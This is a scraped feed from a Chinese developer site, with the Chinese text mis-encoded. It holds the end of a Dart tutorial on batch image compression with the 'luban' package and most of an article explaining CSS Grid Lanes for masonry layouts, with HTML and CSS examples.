<h3 data-id="heading-14">æ‰¹é‡å‹ç¼©å›¾ç‰‡</h3>
<p>æ‰¹é‡å‹ç¼©è¿”å› <code>Result&lt;BatchCompressionResult&gt;</code>ï¼Œéœ€è¦å…ˆæ£€æŸ¥æˆåŠŸæˆ–å¤±è´¥çŠ¶æ€ï¼Œç„¶åè®¿é—® <code>BatchCompressionResult</code> è·å–æ‰€æœ‰å›¾ç‰‡çš„å‹ç¼©ç»“æœã€‚</p>
<h4 data-id="heading-15">ä½¿ç”¨æ–‡ä»¶åˆ—è¡¨</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'dart:io'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:luban/luban.dart'</span>;

Future&lt;<span class="hljs-keyword">void</span>&gt; compressBatchImages() <span class="hljs-keyword">async</span> {
  <span class="hljs-keyword">final</span> files = [
    File(<span class="hljs-string">'/path/to/image1.jpg'</span>),
    File(<span class="hljs-string">'/path/to/image2.jpg'</span>),
    File(<span class="hljs-string">'/path/to/image3.jpg'</span>),
  ];
  
  <span class="hljs-keyword">final</span> result = <span class="hljs-keyword">await</span> Luban.compressBatch(files);
  
  <span class="hljs-keyword">if</span> (result.isSuccess) {
    <span class="hljs-keyword">final</span> batchResult = result.value;
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'æ‰¹é‡å‹ç¼©å®Œæˆ'</span>);
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'æ€»æ•°: <span class="hljs-subst">${batchResult.total}</span>'</span>);
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'æˆåŠŸ: <span class="hljs-subst">${batchResult.successCount}</span>'</span>);
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'å¤±è´¥: <span class="hljs-subst">${batchResult.failureCount}</span>'</span>);
    
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">final</span> item <span class="hljs-keyword">in</span> batchResult.items) {
      <span class="hljs-keyword">if</span> (item.isSuccess) {
        <span class="hljs-keyword">final</span> compressionResult = item.result.value;
        <span class="hljs-built_in">print</span>(<span class="hljs-string">'<span class="hljs-subst">${item.originalPath}</span>: <span class="hljs-subst">${compressionResult.compressedSizeKb}</span> KB'</span>);
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-built_in">print</span>(<span class="hljs-string">'<span class="hljs-subst">${item.originalPath}</span>: å‹ç¼©å¤±è´¥ - <span class="hljs-subst">${item.result.error}</span>'</span>);
      }
    }
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'æ‰¹é‡å‹ç¼©å¤±è´¥: <span class="hljs-subst">${result.error}</span>'</span>);
  }
}
</code></pre>
<h4 data-id="heading-16">ä½¿ç”¨è·¯å¾„åˆ—è¡¨</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'package:luban/luban.dart'</span>;

Future&lt;<span class="hljs-keyword">void</span>&gt; compressBatchImages() <span class="hljs-keyword">async</span> {
  <span class="hljs-keyword">final</span> paths = [
    <span class="hljs-string">'/path/to/image1.jpg'</span>,
    <span class="hljs-string">'/path/to/image2.jpg'</span>,
    <span class="hljs-string">'/path/to/image3.jpg'</span>,
  ];
  
  <span class="hljs-keyword">final</span> result = <span class="hljs-keyword">await</span> Luban.compressBatchPaths(paths);
  
  result.fold(
    (error) =&gt; <span class="hljs-built_in">print</span>(<span class="hljs-string">'æ‰¹é‡å‹ç¼©å¤±è´¥: <span class="hljs-subst">$error</span>'</span>),
    (batchResult) {
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'æ‰¹é‡å‹ç¼©å®Œæˆï¼ŒæˆåŠŸ <span class="hljs-subst">${batchResult.successCount}</span>/<span class="hljs-subst">${batchResult.total}</span> å¼ '</span>);
      
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">final</span> compressionResult <span class="hljs-keyword">in</span> batchResult.successfulResults) {
        <span class="hljs-built_in">print</span>(<span class="hljs-string">'<span class="hljs-subst">${compressionResult.file.path}</span>: <span class="hljs-subst">${compressionResult.compressedSizeKb}</span> KB'</span>);
      }
    },
  );
}
</code></pre>
<h4 data-id="heading-17">æ‰¹é‡å‹ç¼©å¹¶æŒ‡å®šè¾“å‡ºç›®å½•</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'dart:io'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:luban/luban.dart'</span>;

Future&lt;<span class="hljs-keyword">void</span>&gt; compressBatchImages() <span class="hljs-keyword">async</span> {
  <span class="hljs-keyword">final</span> files = [
    File(<span class="hljs-string">'/path/to/image1.jpg'</span>),
    File(<span class="hljs-string">'/path/to/image2.jpg'</span>),
  ];
  <span class="hljs-keyword">final</span> outputDir = Directory(<span class="hljs-string">'/path/to/output'</span>);
  
  <span class="hljs-keyword">final</span> result = <span class="hljs-keyword">await</span> Luban.compressBatch(files, outputDir: outputDir);
  
  <span class="hljs-keyword">if</span> (result.isSuccess) {
    <span class="hljs-keyword">final</span> batchResult = result.value;
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'æ‰¹é‡å‹ç¼©å®Œæˆï¼ŒæˆåŠŸ <span class="hljs-subst">${batchResult.successCount}</span> å¼ '</span>);
    
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">final</span> compressionResult <span class="hljs-keyword">in</span> batchResult.successfulResults) {
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'å‹ç¼©æ–‡ä»¶: <span class="hljs-subst">${compressionResult.file.path}</span>'</span>);
    }
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'æ‰¹é‡å‹ç¼©å¤±è´¥: <span class="hljs-subst">${result.error}</span>'</span>);
  }
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[CSS æ–°ç‰¹æ€§ï¼ç€‘å¸ƒæµå¸ƒå±€çš„ç»ˆæè§£å†³æ–¹æ¡ˆ]]></title>    <link>https://juejin.cn/post/7592805973120401414</link>    <guid>https://juejin.cn/post/7592805973120401414</guid>    <pubDate>2026-01-08T09:11:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592805973120401414" data-draft-id="7592555965792141318" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="CSS æ–°ç‰¹æ€§ï¼ç€‘å¸ƒæµå¸ƒå±€çš„ç»ˆæè§£å†³æ–¹æ¡ˆ"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,CSS"/> <meta itemprop="datePublished" content="2026-01-08T09:11:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å†´ç¾½"/> <meta itemprop="url" content="https://juejin.cn/user/712139234359182"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            CSS æ–°ç‰¹æ€§ï¼ç€‘å¸ƒæµå¸ƒå±€çš„ç»ˆæè§£å†³æ–¹æ¡ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/712139234359182/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å†´ç¾½
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T09:11:12.000Z" title="Thu Jan 08 2026 09:11:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>å‰ç«¯å¼€å‘ä¸€ç›´æœ‰ä¸€ä¸ªè€å¤§éš¾çš„é—®é¢˜ï¼Œé‚£å°±æ˜¯â€”â€”ç€‘å¸ƒæµå¸ƒå±€ã€‚</p>
<p>æ•ˆæœéœ€æ±‚å¹¶ä¸å¤æ‚ï¼šå¡ç‰‡é”™è½ï¼Œå‚å·®æœ‰è‡´ï¼Œçœ‹èµ·æ¥é«˜çº§ï¼Œæ»šåŠ¨èµ·æ¥æµç•…ã€‚</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4cb461618ba048129a3671b86e837821~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469734&amp;x-signature=2SRdg%2BBxLzjywu%2BafHIsBcimrBo%3D" alt="" loading="lazy"/></p>
<p>å°±æ˜¯è¿™æ ·ä¸€ä¸ªçœ‹ä¼¼ç®€å•çš„æ•ˆæœï¼Œå…¶å®å·²ç»å›°æ‰°äº†å‰ç«¯å¼€å‘è€…å¥½å¤šå¹´ã€‚</p>
<p>è¦å¼•å…¥ JavaScript åº“ï¼Œè¦è®©å†…å®¹æ™ºèƒ½å¡«å……ï¼Œè¦å®ç°å“åº”å¼å¸ƒå±€ï¼Œå†™æ— æ•°ä¸ªåª’ä½“æŸ¥è¯¢ï¼Œè¦å®ç°æ— é™æ»šåŠ¨åŠ è½½ï¼Œè¦ç”¨ JavaScript å¤„ç†å¤æ‚çš„å¸ƒå±€é€»è¾‘â€¦â€¦</p>
<p>ç°åœ¨ï¼Œç»è¿‡ Mozillaã€è‹¹æœ WebKit å›¢é˜Ÿã€CSS å·¥ä½œç»„å’Œæ‰€æœ‰æµè§ˆå™¨çš„å¤šè½®è®¨è®ºï¼Œå®ƒç»ˆäºæœ‰äº†ç»ˆæè§£å†³æ–¹æ¡ˆï¼</p>
<p>è¿™å°±æ˜¯ <strong>CSS Grid Lanes</strong>ã€‚</p>
<p>ä¸”è®©æˆ‘ä»¬å…ˆç¿»è¯‘å®ƒä¸ºâ€œCSS ç½‘æ ¼è½¦é“â€å§ã€‚</p>
<p>ä¹‹æ‰€ä»¥å«è½¦é“ï¼Œæƒ³è±¡ä¸€ä¸‹é«˜é€Ÿå…¬è·¯ï¼šæœ‰å¥½å‡ æ¡è½¦é“ï¼Œè½¦è¾†ä¼šè‡ªåŠ¨é€‰æ‹©æœ€çŸ­çš„é‚£æ¡è½¦é“æ’é˜Ÿã€‚</p>
<p>CSS Grid Lanes å°±æ˜¯è¿™ä¸ªåŸç†â€”â€”ä½ å…ˆå®šä¹‰å¥½æœ‰å‡ æ¡â€œè½¦é“â€ï¼ˆåˆ—ï¼‰ï¼Œç½‘é¡µå†…å®¹ä¼šè‡ªåŠ¨å¡«å……åˆ°æœ€çŸ­çš„é‚£ä¸€åˆ—ï¼Œå°±åƒè½¦è¾†è‡ªåŠ¨é€‰æ‹©æœ€ä¸æ‹¥å µçš„è½¦é“ä¸€æ ·ã€‚</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/70e233f775d7494e97683ef53e2c76a9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469734&amp;x-signature=%2Fy1sj6MSxm8u7jN5GAb6JeFfJGw%3D" alt="" loading="lazy"/></p>
<p>å…·ä½“ä½¿ç”¨èµ·æ¥ä¹Ÿå¾ˆç®€å•ï¼Œä¸‰è¡Œä»£ç å°±èƒ½å®ç°ï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.container</span> {
  <span class="hljs-attribute">display</span>: grid-lanes;
  <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(auto-fill, <span class="hljs-built_in">minmax</span>(<span class="hljs-number">250px</span>, <span class="hljs-number">1</span>fr));
  <span class="hljs-attribute">gap</span>: <span class="hljs-number">16px</span>;
}
</code></pre>
<h2 data-id="heading-1">å®ç°åŸç†</h2>
<p>ç°åœ¨ï¼Œè®©æˆ‘ä»¬æ¥ç»†è‡´è®²è§£ä¸‹å¦‚ä½•å®ç°å¼€å¤´å›¾ä¸­çš„ç€‘å¸ƒæµæ•ˆæœã€‚</p>
<p>é¦–å…ˆæ˜¯ HTML ä»£ç ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">main</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">figure</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"photo-1.jpg"</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">figure</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">figure</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"photo-2.jpg"</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">figure</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">figure</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"photo-3.jpg"</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">figure</span>&gt;</span>
  <span class="hljs-comment">&lt;!-- etc --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">main</span>&gt;</span>
</code></pre>
<p>ç„¶åæ˜¯ CSS ä»£ç ï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.container</span> {
  <span class="hljs-attribute">display</span>: grid-lanes;
  <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(auto-fill, <span class="hljs-built_in">minmax</span>(<span class="hljs-number">250px</span>, <span class="hljs-number">1</span>fr));
  <span class="hljs-attribute">gap</span>: <span class="hljs-number">16px</span>;
}
</code></pre>
<p>ä»£ç ä¸€å…± 3 è¡Œã€‚</p>
<p><code>display: grid-lanes</code> åˆ›å»ºç½‘æ ¼å®¹å™¨ï¼Œä½¿ç”¨ç€‘å¸ƒæµå¸ƒå±€ã€‚</p>
<p><code>grid-template-columns</code> åˆ›å»ºè½¦é“ï¼Œæˆ‘ä»¬å°†å€¼è®¾ä¸º <code>repeat(auto-fill, minmax(250px, 1fr))</code>ï¼Œ<strong>æ„æ€æ˜¯è‡³å°‘ 250 åƒç´ å®½çš„çµæ´»åˆ—ã€‚æµè§ˆå™¨å†³å®šåˆ›å»ºå¤šå°‘åˆ—ï¼Œå¹¶å¡«å……æ‰€æœ‰å¯ç”¨ç©ºé—´ã€‚</strong></p>
<p><code>gap: 16px</code>è¡¨ç¤ºè½¦é“ä¹‹é—´æœ‰ 16px çš„é—´æ­‡ã€‚</p>
<p>å°±æ˜¯è¿™ä¹ˆç®€å•ã€‚</p>
<p><strong>3 è¡Œ CSS ä»£ç ï¼Œæ— éœ€ä»»ä½•åª’ä½“æŸ¥è¯¢æˆ–å®¹å™¨æŸ¥è¯¢ï¼Œæˆ‘ä»¬å°±åˆ›å»ºäº†ä¸€ä¸ªé€‚ç”¨äºæ‰€æœ‰å±å¹•å°ºå¯¸çš„çµæ´»å¸ƒå±€ã€‚</strong></p>
<hr/>
<p>æ›´ç»çš„æ˜¯ï¼Œè¿™ç§å¸ƒå±€èƒ½è®©ç”¨æˆ·é€šè¿‡ Tab é”®åœ¨å„ä¸ªæ ç›®ä¹‹é—´åˆ‡æ¢ï¼Œè®¿é—®æ‰€æœ‰å½“å‰å¯è§çš„å†…å®¹ï¼ˆè€Œä¸æ˜¯åƒä»¥å‰é‚£æ ·ï¼Œå…ˆæ»šåŠ¨åˆ°ç¬¬ä¸€åˆ—åº•éƒ¨ï¼Œç„¶åå†è¿”å›ç¬¬äºŒåˆ—é¡¶éƒ¨ï¼‰ã€‚</p>
<p>å®ƒä¹Ÿæ”¯æŒä½ å®ç°æ— é™å¾ªç¯åŠ è½½ï¼Œéšç€ç”¨æˆ·æ»šåŠ¨é¡µé¢ï¼Œå†…å®¹æ— é™åŠ è½½ï¼Œè€Œæ— éœ€ä½¿ç”¨ JavaScript æ¥å¤„ç†å¸ƒå±€ã€‚</p>
<h2 data-id="heading-2">åŠŸèƒ½å¼ºå¤§</h2>
<h3 data-id="heading-3">ä¸åŒè½¦é“å°ºå¯¸</h3>
<p>Grid Lanes å……åˆ†åˆ©ç”¨äº† CSS Grid çš„å¼ºå¤§åŠŸèƒ½ <code>grid-template-*</code>æ¥å®šä¹‰è½¦é“ï¼Œæ‰€ä»¥å¾ˆå®¹æ˜“åˆ›å»ºå‡ºå¯Œæœ‰åˆ›æ„çš„å¸ƒå±€ã€‚</p>
<p>ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªå¸ƒå±€ï¼Œå…¶ä¸­çª„åˆ—å’Œå®½åˆ—äº¤æ›¿å‡ºç°â€”â€”å³ä½¿åˆ—æ•°éšè§†å£å¤§å°è€Œå˜åŒ–ï¼Œç¬¬ä¸€åˆ—å’Œæœ€åä¸€åˆ—ä¹Ÿå§‹ç»ˆæ˜¯çª„åˆ—ã€‚</p>
<p>å®ç°ä¹Ÿå¾ˆç®€å•ï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(auto-fill, <span class="hljs-built_in">minmax</span>(<span class="hljs-number">8rem</span>, <span class="hljs-number">1</span>fr) <span class="hljs-built_in">minmax</span>(<span class="hljs-number">16rem</span>, <span class="hljs-number">2</span>fr)) <span class="hljs-built_in">minmax</span>(<span class="hljs-number">8rem</span>, <span class="hljs-number">1</span>fr);
</code></pre>
<p>æ•ˆæœå¦‚ä¸‹ï¼š</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e43e4b7a0c2542d8b72e051b7d03b610~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469734&amp;x-signature=Hiz5pxxyzUR8shGz%2B2RsEFv8e6k%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-4">è·¨è½¦é“</h3>
<p>ç”±äºæˆ‘ä»¬æ‹¥æœ‰ç½‘æ ¼å¸ƒå±€çš„å…¨éƒ¨åŠŸèƒ½ï¼Œæˆ‘ä»¬å½“ç„¶ä¹Ÿå¯ä»¥è·¨è¶Šè½¦é“ã€‚</p>
<p>æ•ˆæœå¦‚ä¸‹ï¼š</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e9ddaa092544490eaed6ac584bafd1ab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469734&amp;x-signature=fbRtAt2XS%2FPCCyJKxciCTkxIoQs%3D" alt="" loading="lazy"/></p>
<p>å®ç°ä»£ç ï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">main</span> {
  <span class="hljs-attribute">display</span>: grid-lanes;
  <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(auto-fill, <span class="hljs-built_in">minmax</span>(<span class="hljs-number">20ch</span>, <span class="hljs-number">1</span>fr));
  <span class="hljs-attribute">gap</span>: <span class="hljs-number">2</span>lh;
}
<span class="hljs-selector-tag">article</span> {
  <span class="hljs-attribute">grid-column</span>: span <span class="hljs-number">1</span>;
}
<span class="hljs-keyword">@media</span> (<span class="hljs-number">1250px</span> &lt; <span class="hljs-attribute">width</span>) {
  <span class="hljs-selector-tag">article</span><span class="hljs-selector-pseudo">:nth-child</span>(<span class="hljs-number">1</span>) {
    <span class="hljs-attribute">grid-column</span>: span <span class="hljs-number">4</span>;
  }
  <span class="hljs-selector-tag">article</span><span class="hljs-selector-pseudo">:nth-child</span>(<span class="hljs-number">2</span>),
  <span class="hljs-selector-tag">article</span><span class="hljs-selector-pseudo">:nth-child</span>(<span class="hljs-number">3</span>),
  <span class="hljs-selector-tag">article</span><span class="hljs-selector-pseudo">:nth-child</span>(<span class="hljs-number">4</span>),
  <span class="hljs-selector-tag">article</span><span class="hljs-selector-pseudo">:nth-child</span>(<span class="hljs-number">5</span>),
  <span class="hljs-selector-tag">article</span><span class="hljs-selector-pseudo">:nth-child</span>(<span class="hljs-number">6</span>),
  <span class="hljs-selector-tag">article</span><span class="hljs-selector-pseudo">:nth-child</span>(<span class="hljs-number">7</span>),
  <span class="hljs-selector-tag">article</span><span class="hljs-selector-pseudo">:nth-child</span>(<span class="hljs-number">8</span>) {
    <span class="hljs-attribute">grid-column</span>: span <span class="hljs-number">2</span>;
  }
}
</code></pre>
<h3 data-id="heading-5">æ”¾ç½®é¡¹ç›®</h3>
<p>æˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨ä½¿ç”¨ç½‘æ ¼è½¦é“æ—¶æ˜¾å¼åœ°æ”¾ç½®é¡¹ç›®ã€‚è¿™æ—¶ï¼Œæ— è®ºæœ‰å¤šå°‘åˆ—ï¼Œæ ‡é¢˜å§‹ç»ˆä½äºæœ€åä¸€åˆ—ã€‚</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6e0c285c55e548109ef576fb38505b25~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469734&amp;x-signature=WMczSVgEgOXgBErcyNPJlP9HkHU%3D" alt="" loading="lazy"/></p>
<p>å®ç°ä»£ç ä¸ºï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">main</span> {
  <span class="hljs-attribute">display</span>: grid-lanes;
  <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(auto-fill, <span class="hljs-built_in">minmax</span>(<span class="hljs-number">24ch</span>, <span class="hljs-number">1</span>fr));
}
<span class="hljs-selector-tag">header</span> {
  <span class="hljs-attribute">grid-column</span>: -<span class="hljs-number">3</span> / -<span class="hljs-number">1</span>;
}
</code></pre>
<h2 data-id="heading-6">æ”¹å˜æ–¹å‘</h2>
<p>ç½‘æ ¼è½¦é“ä¹Ÿå¯ä»¥åŒå‘æ’åˆ—ï¼</p>
<p>ä¸Šé¢çš„æ‰€æœ‰ç¤ºä¾‹åˆ›å»ºçš„æ˜¯â€œç€‘å¸ƒå¼â€å¸ƒå±€ï¼Œå†…å®¹ä»¥åˆ—çš„å½¢å¼æ’åˆ—ã€‚</p>
<p>ç½‘æ ¼è½¦é“ä¹Ÿå¯ä»¥ç”¨äºåˆ›å»ºå¦ä¸€ç§æ–¹å‘çš„å¸ƒå±€ï¼Œå³â€œç –å—å¼â€å¸ƒå±€ã€‚</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bd785169146a4b079c80b39ff00bf19f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469734&amp;x-signature=p%2FldkbgecAKVqifupFMkn9te9WI%3D" alt="" loading="lazy"/></p>
<p>å½“ä½¿ç”¨ <code>grid-template-columns</code>å®šä¹‰åˆ—æ—¶ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨åˆ›å»ºç€‘å¸ƒå¼å¸ƒå±€ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.container</span> {
  <span class="hljs-attribute">display</span>: grid-lanes;
